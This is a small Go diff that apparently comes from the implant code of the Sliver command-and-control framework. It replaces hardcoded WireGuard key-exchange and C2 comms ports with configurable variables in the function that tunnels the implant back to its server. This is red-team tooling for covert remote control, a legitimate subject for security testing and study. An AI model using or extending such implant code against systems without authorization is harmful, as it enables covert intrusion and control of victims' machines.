@@ -44,9 +44,7 @@ import (
 )
 
 var (
-	serverTunIP           = "100.64.0.1" // Don't let user configure this for now
-	serverKeyExchangePort = 1337         // Server TCP port for wg key exchange. Virtual netstack port.
-	serverTunPort         = 8888         // Server TCP port for c2 comms. Virtual netstack port.
+	serverTunIP = "100.64.0.1" // Don't let user configure this for now
 )
 
 // socketWGWriteEnvelope - Writes a message to the wireguard socket using length prefix framing
@@ -139,7 +137,7 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	log.Printf("Intial wg connection. Attempting to connect to wg key exchange listener")
 	// {{end}}
 
-	keyExchangeConnection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverKeyExchangePort))
+	keyExchangeConnection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgKeyExchangePort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
@@ -166,7 +164,7 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	// Bring up second wireguard connection using retrieved keys and IP
 	_, dev, tnet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
 
-	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverTunPort))
+	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to sliver listener: %v", err)
